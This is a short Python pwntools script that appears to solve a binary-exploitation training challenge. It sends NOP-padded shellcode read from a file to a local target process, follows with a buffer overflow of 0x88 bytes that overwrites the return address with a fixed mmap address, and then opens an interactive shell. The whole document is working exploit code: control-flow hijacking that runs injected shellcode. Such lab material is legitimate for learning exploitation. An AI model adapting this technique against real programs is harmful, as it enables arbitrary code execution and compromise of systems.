from pwn import *

shell_adress = 0x17d44000
ofsset = 0x80 + 8
f = open('shellcode-raw','rb') 
shell = f.read()
# print(shell)

r = process('/challenge/binary-exploitation-hijack-to-mmap-shellcode-w')
print(r.recv(timeout=2).decode())
shell = shell.ljust(0x1000, b'\x90') 
r.send(shell)
print(r.recv(timeout=2).decode())
payload = ofsset * b'\0' + p64(shell_adress)
r.send(payload)
print(r.recv(timeout=2).decode())
r.interactive()
